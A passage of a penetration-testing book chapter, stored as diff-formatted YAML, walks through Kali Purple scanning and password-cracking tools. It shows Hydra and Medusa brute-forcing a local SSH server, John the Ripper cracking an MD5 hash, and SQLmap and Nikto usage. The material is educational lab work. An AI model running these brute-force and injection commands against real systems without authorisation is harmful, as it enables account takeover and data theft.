+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Port scanning**: Nmap can scan ports on target hosts to identify open ports
+    and services running on those ports. It supports a variety of port scanning styles,
+    including a SYN scan, TCP connect scan, UDP scan, and others. This high level
+    of flexibility is crucial for ethical hackers/pentesters and malicious cyber criminals
+    alike because it helps them all paint a clearer picture of the total attack surface
+    of a network.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Service version detection**: In addition to providing extensive support for
+    IPv6, Nmap can also detect versions of applications/services that are running
+    on the target host. It can also detect network-specific devices and services.
+    This is important because it can help in identifying vulnerabilities based on
+    and known to be associated with specific versions, as well as network composition
+    and overall layout.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Operating system detection**: Nmap will make an educated guess about which
+    operating system is operating on a target host by analyzing the various network
+    packet responses it receives. Each type of operating system has unique behaviors
+    in the way they operate, much the same as people – even similar people – have
+    subtle uniqueness associated with them.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Scriptable interaction**: Nmap includes a scripting engine to allow users
+    to write scripts to automate a wide variety of networking tasks, from vulnerability
+    detection to advanced network discovery tasks.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Flexible timing and performance**: Because it’s valuable in automation, Nmap
+    provides options to control the timing of scans. The reason controlling this is
+    important is because it allows pentesters to balance speed and stealth more closely
+    according to their needs.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Output options**: Nmap supports a variety of output formats, including an
+    interactive mode, a grepable mode, XML, and other formats that are used for reporting
+    purposes so that other analysts can review scan results.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: You’re probably beginning to sense a theme developing here, but Nmap should
+    already be installed within your Kali Purple instance. You can check this by selecting
+    the Kali dragon icon in the top-left corner of your environment and either typing
+    **Nmap** in the search bar or scrolling down and highlighting **Information Gathering**
+    and then moving your cursor to the newly expanded column on the right-hand side.
+    Once you’ve done this, scroll until you find the **Nmap** option. At the command
+    line, do your thing. Type **sudo apt update** and **sudo apt upgrade** if it suits
+    you. Follow this with **sudo apt** **install nmap**.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Unlike the previous applications we’ve covered in this chapter, Nmap doesn’t
+    have a pretty GUI to work from. You will use it directly from the command line,
+    even if you invoke the application by using the drop-down menu and icon. To use
+    Nmap from the command line, simply type **sudo nmap <options> <target>**. You
+    can type **nmap** alone to get a listing of available options. The target will
+    be something like the value of an IP address, URL, or hostname. For a fun example,
+    after typing **nmap** and reviewing the options, type **nmap -v -sn -T1 127.0.0.1**
+    and compare your results to what’s shown in *Figure 10**.17*. Review the list
+    of options you typed and compare them to that output and the list that’s printed
+    to your screen when after typing **nmap**. You should begin to understand what’s
+    going on by making those comparisons. Play around with different options as much
+    as you like but remember not to scan any host, URL, or IP address that you don’t
+    have explicit permission to scan:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.17 – Nmap example scan of the localhost](image/B21223_10_17.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.17 – Nmap example scan of the localhost
+  prefs: []
+  type: TYPE_NORMAL
+- en: SQLmap
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: Nmap specializes in network scanning. There is another type of vulnerability
+    scanner that specializes in detecting database vulnerabilities in SQL databases
+    associated with web applications. It is aptly named **SQLmap**, and it does more
+    than just detect vulnerabilities. It also helps to exploit them.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Some of the key features of SQLmap are as follows:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**Automated SQL injection detection**: SQLmap is built to automatically detect
+    SQL injection vulnerabilities within web applications by analyzing responses from
+    the target, much like Nmap does, but it can also exploit these vulnerabilities.
+    It performs these exploits through various actions, such as dumping database contents,
+    altering database structures, or executing arbitrary commands on the server.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Support for multiple database management systems**: SQLmap supports various
+    database management systems, including the well-known MySQL, Oracle, and PostgreSQL,
+    along with Microsoft SQL Server, SQLite, and others. This adds a level of versatility
+    to the application.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Detection and database schema data**: This application can identify the database
+    schema, tables, columns, and data stored within the target database. This could
+    end up providing very valuable insights for the pentester to use for further exploitation
+    of a system or organization.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Brute force and dictionary-based attacks**: SQLmap supports brute-force and
+    dictionary-styled attacks, which it uses in attempts to guess database names,
+    tables, columns, and user accounts.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**SQL shell**: SQLmap provides an interactive SQL-based shell for executing
+    commands directly upon the target system’s database. This gives the pentesters
+    an avenue to perform advanced database manipulation.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Enumeration of backend database credentials**: SQLmap can retrieve usernames
+    and password hashes from the database, facilitating unauthorized access to the
+    database.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Detection of filesystem access**: By taking advantage of any discovered SQL
+    injection vulnerabilities on the server, SQLmap can detect filesystem access and
+    enable access to sensitive files on the server.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Customizable testing parameters**: SQLmap offers a wide range of testing
+    options and parameters to customize the scanning process based on specific requirements
+    and target applications.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Detection of blind SQL injection**: SQLmap can also detect blind SQL injection
+    vulnerabilities. This is where the application will not display error responses.
+    It detects these vulnerabilities by using time-based and Boolean-based techniques
+    to run interference.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Integration and support for web application firewalls (WAFs) and other tools**:
+    SQLmap can bypass certain WAFs and evasion techniques to successfully exploit
+    SQL injection vulnerabilities in protected web applications. It can also be integrated
+    with popular web application security testing tools such as Burp Suite.'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: To get SQLmap, at the command line, type **sudo apt update** and **sudo apt
+    upgrade** if it suits you. Follow this up with **sudo apt** **install sqlmap**.
+  prefs: []
+  type: TYPE_NORMAL
+- en: To use the application, type **sqlmap -u <target>**, where **target** is the
+    target URL of the application or database you wish to attack.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Nikto
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: '**Nikto** is another scanner, one that specializes in scanning web servers.
+    It’s very lightweight and easy to use.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'First, grab a copy by doing your **sudo apt update** and **upgrade** magic
+    and continue by typing **sudo apt install nikto**. It should install very quickly
+    and painlessly. Once done and since you’re already in your Kali Purple environment,
+    you should be able to invoke the utility and perform a scan immediately and directly
+    from the command line. Type **nikto -h <target>**. In our case, we’ll just scan
+    our localhost. So, we’ll type **nikto -h 127.0.0.1**. As shown in *Figure 10**.18*,
+    it didn’t find much – because we don’t have much. However, much is not always
+    necessary in the eyes of an attacker. Look carefully at the results; you will
+    still find an abundance of useful information that was returned from the scan:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.18 – Nikto scan of the Kali Purple host system’s web server](image/B21223_10_18.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.18 – Nikto scan of the Kali Purple host system’s web server
+  prefs: []
+  type: TYPE_NORMAL
+- en: Our limited results scan still told us that the type of web server is CherryPy
+    version 18.9.0\. Ohhhhh… but look at the juicy bit of intelligence on the very
+    next line! This server doesn’t have an anti-clickjacking X-Frame Option header.
+    If you were a cybercriminal looking to exploit, what do you suppose you would
+    do with that? That’s right – you’d want to consider clickjacking attacks! If you’re
+    an experienced attacker, you’ll first search for any publicly available information
+    about clickjacking as it relates to that specific server type and version. In
+    many cases, the information – sometimes even step-by-step handholding instructions
+    – is already out there on the web. Conversely, if you’re a pentester, you now
+    know you need to perform equivalent research in terms of how to provide the anti-clickjacking
+    X-Frame Option header.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Nessus
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: If you go to work in a SOC environment, you will eventually come across traffic
+    that traces to Tenable Network Security’s flagship product, **Nessus**. Nessus
+    is a vulnerability assessment and management tool that’s designed to help organizations
+    identify and remediate vulnerabilities in their network, infrastructure, and systems.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Nessus’ highlights – which you’ve already seen in other software we’ve covered
+    – include the following:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Customizable vulnerability scanning
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Support for multiple operating systems
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: API integration and plugin-based architecture
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Policy compliance and configuration auditing
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Patching and remediation
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Scheduled scans and reporting
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Risk prioritization
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Support for both cloud and on-premises deployment
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Scalability and performance
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Tenable’s Nessus is a commercial product that only offers a 7-day free trial.
+    Since the theme of this book is helping marry free and open source solutions with
+    the equally free and open source Kali Purple, we won’t go into too much detail
+    here. However, we’d be remiss not to mention this product and that it is compatible
+    with the Kali Purple operating system given its wide-scale popularity in the cybersecurity
+    community. We’ve placed a link in *Further reading* if you wish to learn more
+    about one of the most recognized vulnerability scanners in the world.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Greenbone Vulnerability Management and OpenVAS
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: OpenVAS is an open source version of vulnerability scanning and a competing
+    product to Nessus.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'OpenVAS’ highlights – which you’ve already seen in other software we’ve covered
+    – include the following:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Vulnerability scanning
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Automated and scheduled scanning
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Network discovery
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: CVE compatibility
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Reporting and remediation
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Scalability and flexibility
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Third-party integration support
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Threat intelligence feeds
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Community-wide support
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: 'You can grab **OpenVAS** through the typical means. Run **sudo apt update**
+    and **upgrade**, which you’re probably able to do blindfolded by now. Then, continue
+    by typing **sudo apt install gvm-tools**. This is where things depart from how
+    we’ve done things in the past. Accept any prompts if there are any and wait a
+    few minutes for **Greenbone**, which includes OpenVAS to install. Once it’s done,
+    you still have some configuring to do. Select the Kali dragon icon in the top
+    left and start typing **gvm** until some **gvm** fields populate, as shown in
+    *Figure 10**.19*:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.19 – Greenbone management options under the Kali dragon logo](image/B21223_10_19.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.19 – Greenbone management options under the Kali dragon logo
+  prefs: []
+  type: TYPE_NORMAL
+- en: Start by selecting **gvm initial setup** and let it run its course. Everything
+    is automated. Then, select **gvm check setup**. You might be prompted to fix a
+    certificate error by typing **sudo runuser -u _gvm – gvm-manage-certs -a -f**
+    – trust us, it’s worth typing that command. It will save you a lot of time and
+    effort and if you aren’t up to speed with certificates, it will also save you
+    a lot of headaches. When you’re finished, run the **gvm check setup** option again.
+    Pay close attention to see if there are any additional errors or commands to run.
+    One of the sweetest features of this process is that if there are any adjustments,
+    it will tell you precisely character-for-character what to type. Run this feature
+    over and over until there are no more configurations or adjustments to make. Keep
+    in mind that any time you’re updating a feed, there will be a long delay. Be patient.
+    The operating system isn’t hanging. It simply takes a long time for those items
+    to complete.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Install the Redis server by typing **sudo apt install redis** and then start
+    the service by typing **sudo systemctl start redis**. Verify it’s running properly
+    by typing **sudo systemctl status redis**. When you get this far, because installing
+    and configuring GVM can tend to be a bit of a hassle and is very sensitive to
+    upgrades, we highly recommend doing another **sudo apt update**/**upgrade** to
+    ensure everything is operating on an even keel and then completely rebooting and/or
+    restarting GVM. Just like Nmap, SQLmap, and Nikto, the commands to initiate a
+    scan are fairly straightforward. Type **gvm-cli -h** to get a list of options
+    and have fun!
+  prefs: []
+  type: TYPE_NORMAL
+- en: As you can see, Kali Purple offers a plethora of scanning utilities covering
+    nearly every scanning type and style you could think of, from network to database
+    to web servers to infrastructure. Some scanning tools are built to handle more
+    than one area of specialization. What happens when these scanners uncover vulnerabilities,
+    such as weak password rulesets? Sure enough, Kali Purple also has tools to assist
+    in exploiting discovered vulnerabilities.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Password cracking
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: Scanning and finding vulnerabilities in web or other technology applications
+    is an integral part of the overall cyberattack flow. However, the ultimate goal
+    is to gain access to the target and, if possible, elevate your privileges once
+    inside so that you can wreak all manners of remorseless havoc.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Hydra
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: '**Hydra** is a password-cracking tool that is widely used for performing online
+    password attacks on various network protocols. Its design is meant to help cybersecurity
+    pentesters and other offensive security personnel work against the security of
+    network systems by guessing and/or identifying weak passwords.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Here are some highlights of Hydra:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: Support for multiple types of protocols
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Brute-force and dictionary attacks
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Parallelized attack sessions
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Customizable attack parameters
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Session resumption and pause/resume functionality
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Username enumeration
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: User-friendly command-line interface
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Logging and reporting
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Support for SSL/TLS security
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Cross-platform compatibility
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: Extensibility with community support
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: To use Hydra, you can select the Kali dragon icon in the top-left corner of
+    our environment and either type **Hydra** in the search bar or scroll down and
+    highlight **Password Attacks**. Then, move your cursor to the newly expanded column
+    on the right-hand side and click on the **Hydra** option.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Otherwise, if you prefer to type, then type **sudo apt update**; if the results
+    suggest upgrades, you’ll want to type **sudo apt upgrade** to install them. Once
+    you’re finished, type **sudo apt install hydra** to formally install Hydra.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'For Hydra to work effectively, you will need to either create (good luck with
+    that) or download a password list for the program to use. Here is a brief list
+    of popular password lists people use with password-cracking utilities:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '**SecLists**: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Daniel Miessler’s personal GitHub** **repository**: [https://github.com/danielmiessler](https://github.com/danielmiessler)'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**CrackStation**: [https://crackstation.net/](https://crackstation.net/)'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Probable-Wordlists**: [https://github.com/berzerk0/Probable-Wordlists](https://github.com/berzerk0/Probable-Wordlists)'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Weakpass**: [https://weakpass.com/wordlist](https://weakpass.com/wordlist)'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: '**Hashes.org**: [https://hashes.org](https://hashes.org)'
+  prefs:
+  - PREF_UL
+  type: TYPE_NORMAL
+- en: We are going to use SecLists for our example. To do so, type **git** **clone
+    https://github.com/danielmiessler/SecLists.git**.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Navigate to the directory containing various password lists by typing **cd
+    SecLists/Passwords/** and then typing **ls** to confirm you’re in the right place.
+    If using **cd** doesn’t work, add a forward slash before **SecLists** and try
+    again. You should see a list of many different styles of password lists, as shown
+    in *Figure 10**.20*. We’re going to work off of the **2023-200_most_used_passwords.txt**
+    file. Let’s edit that file by typing **sudo nano 2023-200_most_used_passwords.txt**.
+    On any blank line inside the file, type the password you use to log in to your
+    Kali Purple instance. If there isn’t a blank line, just use the arrow keys on
+    your keyboard to align your cursor at the beginning of any line and press *Enter*
+    to create a new line. Then, once again, use the arrow keys to move to the empty
+    line and input your Kali Purple password. Press *Ctrl* + *X* and select *Y* to
+    save it:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.20 – Hydra /SecLists/Passwords directory of password files](image/B21223_10_20.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.20 – Hydra /SecLists/Passwords directory of password files
+  prefs: []
+  type: TYPE_NORMAL
+- en: We are doing this for demonstration purposes and to keep the crack efficient.
+    We could, in theory, grab a much more in-depth password list that would likely
+    have your Kali Purple password already listed unless you’ve followed some of the
+    advanced password creation methods we’ve talked about in this book. However, the
+    longer the list, the longer it will take Hydra to work through unless we just
+    get lucky, and you happen to have selected a password that is near the top of
+    the list. In Kali Purple, any newly installed and/or launched utilities, such
+    as this SSH server, are going to inherit your default Kali Purple credentials.
+    So, if you’re setting things up in a production environment, make sure to change
+    your default credentials with each application you set up on your system.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now, type **pwd** to get the full file path leading to that directory and remember
+    or record that path. Remember, **pwd** stands for **Print Working Directory**.
+    It’s easy for folks to mistakenly believe it stands for *password*, which could
+    be confusing if you were somewhat new to Linux and attempting a pentest. You will
+    use that full path in your attack in a moment. We’re going to attack an SSH server
+    but to do so, we need to spin one up. Type **sudo systemctl start ssh**; when
+    your command prompt returns, type **sudo systemctl status ssh** to ensure the
+    service is up and running. The terminal will tell you that it is running if it
+    is. From here, we are going to launch a password crack attempt against our SSH
+    server using Hydra. Armed with that information and the full file path, you will
+    decide which password file you’d like Hydra to use and simply enter the command
+    stating the username you’d like Hydra to use, the complete file path of the password
+    file you intend to use, and the protocol you are attacking – in this case, the
+    SSH server.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Before launching Hydra, type **ifconfig** and make a note of the interface you
+    wish to attack. By default, this should be the **eth0** interface. If you have
+    it set to **eth1** or a custom-named interface, then you already have the technical
+    knowledge to grab the IP address you need before proceeding to the next step.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Launch the attack by typing **hydra -l <KaliPurpleUserName> -P <FullPathToPasswordFile>
+    ssh<either eth0 or eth1 IP address>**. So, in our case, this demonstration Kali
+    Purple instance was given the username and password of karllane. Naturally, we
+    would use different and more complicated values for a production or non-training
+    system. The full path to our password file that we learned after typing **pwd**
+    earlier is **/home/karllane/SecLists/Passwords/2023-200_most_used_passwords.txt**.
+    Therefore, the full attack command that we typed to launch the attack was **hydra
+    -l karllane -P /****home/karllane/SecLists/Passwords/2023-200_most_used_passwords.txt
+    ssh://10.0.2.15**.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'If everything worked out as planned, Hydra should discover your password fairly
+    quickly – by fairly quickly, we mean in a nano-second, as shown in *Figure 10**.21*:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.21 – Hydra – successful password crack against our Kali Purple
+    SSH server](image/B21223_10_21.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.21 – Hydra – successful password crack against our Kali Purple SSH
+    server
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now, let’s take a look at Medusa.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Medusa
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: '**Medusa** is a tool that is very similar in function to Hydra. It is not in
+    the Kali menu by default but will show up there under **Password Attacks** after
+    you install it from the command line. Do that now. Type **sudo apt update** and
+    then **sudo apt upgrade** if you prefer. Once you’ve finished, type the command
+    to formally install Medusa – that is, **sudo apt install medusa**. Since we already
+    did the hard work setting everything up with Hydra, this will go much quicker.
+    After installing it, you can pretty much launch your attack right away, assuming
+    your SSH server is still up and running. To find out, type **sudo systemctl status
+    ssh**; if it’s not running, retype that command, replacing the word **status**
+    with **start**. Then, launch your attack by typing **medusa -h 10.0.2.15 -u karllane
+    -P /home/karllane/SecLists/Passwords/2023-200_most_used_passwords.txt -****M ssh**.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'As you will discover, the process is lightning-fast. If successful, you should
+    see the result shown in *Figure 10**.22*:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.22 – Medusa – successful password crack against our Kali Purple
+    SSH server](image/B21223_10_22.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.22 – Medusa – successful password crack against our Kali Purple SSH
+    server
+  prefs: []
+  type: TYPE_NORMAL
+- en: Next, we’ll cover John the Ripper.
+  prefs: []
+  type: TYPE_NORMAL
+- en: John the Ripper
+  prefs:
+  - PREF_H2
+  type: TYPE_NORMAL
+- en: '**John the Ripper** is a very well-known and popular password-cracking tool.
+    It’s often utilized by security professionals and pentesters to test the strength
+    of passwords as well as conduct security assessments for organizations. It is
+    an incredibly versatile password-cracking tool in that it supports a wide range
+    of cryptographic hash algorithms and password formats.'
+  prefs: []
+  type: TYPE_NORMAL
+- en: To use John the Ripper, select the Kali dragon icon in the top-left corner of
+    our environment and either type **john** in the search bar or scroll down and
+    highlight **Password Attacks**. Then, move your cursor to the newly expanded column
+    on the right-hand side and click on the **John the** **Ripper** option.
+  prefs: []
+  type: TYPE_NORMAL
+- en: To install it from the command line, type **sudo apt update** and then **sudo
+    apt upgrade** if you prefer. Once you’re finished, type the command to formally
+    install John the Ripper – that is, **sudo apt** **install john**.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'We’ve already attacked our SSH server twice, so let’s do something different
+    for the sake of staying awake. Let’s do something John the Ripper is well-known
+    for and crack a password hash! First, let’s create a file in which we can store
+    our hash. Type **sudo nano hashtest.txt** or whatever you’d like to name it. Just
+    remember to type the correct name in the command. In the file, type **37203f0ef82c870c36cd6f99e1fbfe4c**
+    as a hash value on the first line, and then press *Ctrl* + *X* to close and save
+    the file, selecting *Y* to confirm your choice. Now, enter the command to invoke
+    John the Ripper (which comes with a pre-installed password list of its own) and
+    run it against the hash value(s) in that file. Type **john –format=raw-md5 hashtest.txt**,
+    replacing the actual name of the text file with the name you chose to name your
+    file. If all goes well, you will discover that the hash value you placed inside
+    that file resolves to the word **valhalla**, as shown in *Figure 10**.23*:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.23 – John the Ripper successfully resolving a hash value from a
+    file](image/B21223_10_23.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.23 – John the Ripper successfully resolving a hash value from a file
+  prefs: []
+  type: TYPE_NORMAL
+- en: Now that we’ve covered packet capture, robust vulnerability scanning, exploit
+    usage, and payload delivery with Metasploit, along with password cracking using
+    Hydra, Medusa, and John the Ripper, we’re going to bring this chapter full circle
+    and go back to web application analysis with ZAP’s chief competition, Burp Suite.
+    Like ZAP, Burp Suite offers a plethora of free training but also has a strong
+    commercial component to its brand.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Burp Suite integration
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: You would be hard-pressed to find a professional web application penetration
+    tester who doesn’t use or at least hasn’t heard of Burp Suite. This tool is produced
+    by a company called PortSwigger. We talked a bit about the structure of Burp Suite
+    in [*Chapter 1*](B21223_01.xhtml#_idTextAnchor013) and encourage you to refer
+    to that chapter if you’d like to review it.
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Let’s quickly grab a copy and set it up for you to play with. Within your Kali
+    Purple instance, open a web browser – ideally Firefox, in this case – and go to
+    [https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install](https://portswigger.net/burp/documentation/desktop/getting-started/download-and-install).
+    Then, scroll down until you see the **Choose your software** options under the
+    **Download** section, as shown in *Figure 10**.24*. Select the **Community** **Edition**
+    option:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.24 – Burp Suite download](image/B21223_10_24.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.24 – Burp Suite download
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'The website should identify your operating system and present the correct option
+    by default. If it doesn’t, you can select the drop-down menu where the operating
+    system is listed and select the appropriate operating system to download the correct
+    Burp Suite option. You should also click on the **show checksums** link to the
+    right of the download button and record those values. When you do, the checksums
+    will be presented to you and the button will change to **hide checksums** (highlighted
+    in *Figure 10**.25*). Record those values:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.25 – Burp Suite download options and checksums](image/B21223_10_25.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.25 – Burp Suite download options and checksums
+  prefs: []
+  type: TYPE_NORMAL
+- en: 'Within your command terminal, navigate to your **Downloads** folder by typing
+    **cd /Downloads** and type **ls** by itself to confirm that the download is present.
+    There should be a file with a name that is similar to **burpsuite_community_linux_v2024_2_1_5.sh**,
+    with the year and version numbers after it differing, depending on when you’re
+    reading this. *Figure 10**.26* shows that there are two file hashes to choose
+    from. You only need to use one to confirm that the download was unaltered. To
+    confirm SHA256, you would type **sha256 burpsuite_community_linux_v2024_2_1_5.sh**;
+    to confirm the MD5 hash, you would type **md5sum burpsuite_community_linux_v2024_2_1_5.sh**.
+    Whichever option you choose, compare the resulting value, as shown in *Figure
+    10**.26*, with the value you recorded from the Burp Suite download page:'
+  prefs: []
+  type: TYPE_NORMAL
+- en: '![Figure 10.26 – Burp Suite checksum confirmation at the command line](image/B21223_10_26.jpg)'
+  prefs: []
+  type: TYPE_IMG
+- en: Figure 10.26 – Burp Suite checksum confirmation at the command line
+  prefs: []
+  type: TYPE_NORMAL
+- en: Since we’re reaching the end of our journey together, we’re going to show you
+    a shortcut to launching the application while simultaneously making sure it has
+    the necessary file permissions for us to launch. Combine **chmod** and launch
+    the application by running **sudo chmod +x burpsuite_community_linux_v2024_2_1_5.sh
+    && ./****burpsuite_community_linux_v2024_2_1_5.sh**.
+  prefs: []
+  type: TYPE_NORMAL
+- en: You should see a pop-up window called **Burp Suite Community Edition Setup Wizard**.
+    Go ahead with the process of installing it by selecting the **Next >** button.
+    You’ll see several screens, each with options for customization. Select **Next
+    >** on each screen until you get to the final screen, where you will have the
+    option to select **Finish**. Do this to allow the wizard to begin extracting the
+    Burp Suite files.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Once you’re finished, you can launch Burp Suite similarly to how we’ve launched
+    other applications in this chapter. As a reminder, to do so, go to the Kali dragon
+    icon in the top-left portion of your Purple instance and either type **Burp**
+    **Suite** in the search bar or scroll down to **All Applications** and observe
+    the application populate in the window that expands to the right. Furthermore,
+    you can try to invoke Burp Suite by simply typing **burpsuite** at the command
+    line. However, this shortcut is not usually included in Kali Linux by default.
+    So, you may be asked to install it either by selecting **Y** for yes and letting
+    automation do it or by typing the full **sudo apt install burpsuite** command
+    at the command line. Please note that this won’t install Burp Suite itself since
+    you’ve already done that! This is only installing the command to invoke Burp Suite
+    from the command line and the name of that command is simply **burpsuite**.
+  prefs: []
+  type: TYPE_NORMAL
+- en: Once you’ve installed this command, you can type **burpsuite** at the command
+    line to launch the application. Once you’ve done that, we recommend accepting
+    the default values throughout the application launch process as a temporary project.
+    The reason is that this will take you to the default dashboard where PortSwigger
+    has provided a plethora of getting started material, video tutorials, guided tours,
+    and a web academy. This product itself could be taught over a couple of college-level
+    courses. These videos provide instruction far better than anything we could print
+    here. If offensive security and pentesting are your things, we highly recommend
+    taking the time to learn and master Burp Suite, and starting with these videos
+    is about the best training you’ll get. It’s worth mentioning that while there
+    is some fee-based training, plenty of *free* training is provided here!
+  prefs: []
+  type: TYPE_NORMAL
+- en: Let’s take a look at what we’ve learned in this chapter!
+  prefs: []
+  type: TYPE_NORMAL
+- en: Summary
+  prefs:
+  - PREF_H1
+  type: TYPE_NORMAL
+- en: In this chapter, you continued to dig deeply into various red team tools and
+    learned how to use them against cyber defenses. In a production setting, the SSH
+    server we attacked would’ve had agents of some sort monitoring the activity and
+    reporting that activity back to our blue team utilities. Data would’ve been gathered,
+    enriched, and stored; then, when an analyst was ready, it would have been displayed
+    through the ELK stack or perhaps one of the IDS/IPS solutions we’ve covered.
+  prefs: []
+  type: TYPE_NORMAL
+- en: In this chapter, we looked at some powerful web application utilities that can
+    be used for vulnerability management to help us enhance the overall security of
+    our web applications. We also explored a variety of reconnaissance and gaining
